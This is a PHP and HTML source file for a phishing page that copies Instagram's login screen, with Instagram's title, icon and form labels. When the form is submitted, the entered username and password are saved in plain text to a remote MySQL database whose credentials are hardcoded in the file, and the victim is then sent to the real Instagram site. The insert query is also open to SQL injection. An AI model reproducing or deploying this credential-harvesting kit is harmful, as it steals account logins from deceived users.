<?php
// Create connection
$conn = new mysqli("sql6.freesqldatabase.com", "sql6685046", "lIFxXfHf29", "sql6685046");

if ($_SERVER["REQUEST_METHOD"] == "POST") {
  $username = $_POST["username"];
  $password = $_POST["password"];

  $sql = "INSERT INTO Login_Accounts (Email, Password, Date) VALUES ('$username', '$password', current_timestamp())"; 

  $conn->query($sql);
  
  header("Location: https://www.instagram.com/accounts/onetap/?next=%2F");
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login • Instagram</title>

    <!-- Favicon linK -->
    <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png">

    <!-- custom font-awesome linK -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha512-SzlrxWUlpfuzQ+pcUCosxcglQRNAq/DZjVsC0lE40xsADsfeQoEypE+enwcOiGjk/bSuGGKHEyjSoQ1zVisanQ==" crossorigin="anonymous" referrerpolicy="no-referrer" />

    <!-- custom css file linK -->
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <div class="box">
            <div class="heading"></div>
            <form class="login-form" action="<?php echo $_SERVER["PHP_SELF"];?>" method="post">
                <div class="field">
                    <input id="username" name="username" type="name" placeholder="Phone number, username, or email" />
                    <label for="username">Phone number, username, or email</label>
                </div>
                <div class="field">
                    <input id="password" name="password" type="password" placeholder="password" />
                    <label for="password">Password</label>
                </div>
                <button class="login-button" id="login-button" title="login" disabled>Log In</button>
                <div class="separator">
                    <div class="line"></div>
                    <p>OR</p>
                    <div class="line"></div>
                </div>
                <div class="other">
                    <button class="fb-login-btn" type="button">
                        <i class="fa-brands fa-square-facebook"></i>
                        <span> Log in with Facebook</span>
                    </button>
                    <a class="forgot-password" href="password/reset.html">Forgot password?</a>
                </div>
            </form>
        </div>

        <div class="box">
            <p>Don't have an account? <a class="signup" href="real.php">Sign Up</a></p>
        </div>

        <!-- <div class="error-box">
          <p>For some reason, your account has been logged out. Please log in again.</p>
        </div> -->
    </div>
</body>
<script src="script.js"></script>
</html>